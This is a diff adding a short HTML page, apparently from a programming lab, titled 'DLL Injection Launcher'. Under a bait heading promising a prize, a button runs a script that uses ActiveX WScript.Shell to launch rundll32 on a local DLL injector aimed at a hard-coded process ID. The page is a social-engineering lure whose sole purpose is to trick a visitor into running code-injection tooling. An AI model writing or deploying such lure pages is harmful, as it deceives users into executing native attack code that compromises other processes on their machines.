@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>DLL Injection Launcher</title>
+  <script type="text/javascript">
+    function LaunchApp() {
+      try {
+        var ws = new ActiveXObject("WScript.Shell");
+        ws.Exec('rundll32.exe "D:\\localdisc\\Programming\\GCC\\DIST\\DIST_lab3\\DLLi\\DllInjectorAsDll.dll" HelperFunc 7568');
+      } catch (e) {
+        alert("Ошибка: " + e.message);
+      }
+    }
+  </script>
+</head>
+<body>
+  <h1>Quick, press for PRIZE!</h1>
+  <button type="button" onclick="LaunchApp()">Click Me!</button>
+</body>
+</html>
